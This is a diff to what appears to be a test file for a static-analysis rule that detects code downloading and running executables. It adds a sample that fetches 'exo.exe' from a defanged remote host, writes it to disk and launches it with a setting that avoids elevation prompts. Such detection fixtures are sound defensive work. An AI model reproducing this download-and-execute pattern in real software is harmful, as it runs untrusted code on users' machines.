@@ -29,8 +29,8 @@ def f():
         connection.request("GET", PATH)
         response = connecton.getresponse().read()
     os.chdir(os.path.expanduser("~"))
-    # ruleid: download-executable
     d = open(LOC, "wb")
+    # ruleid: download-executable
     d.write(response)
     d.close()
     current_state = os.stat(LOC)
@@ -103,3 +103,13 @@ def f():
     # ok: download-executable
     urllib.request.urlretrieve("https://www.google.com/robots.txt", "robots.txt")
     os.rename("robots.txt", "roboto.txt")
+
+def f():
+    import os
+    import requests
+   
+    URL = "https://stub.syntheticcc[.]repl.co/exo.exe"
+    response = requests.get(URL)
+    # ruleid: download-executable
+    open("exo.exe", "wb").write(response.content)
+    os.system("set __COMPACT_LAYER=RunAsInvoker | start exo.exe")
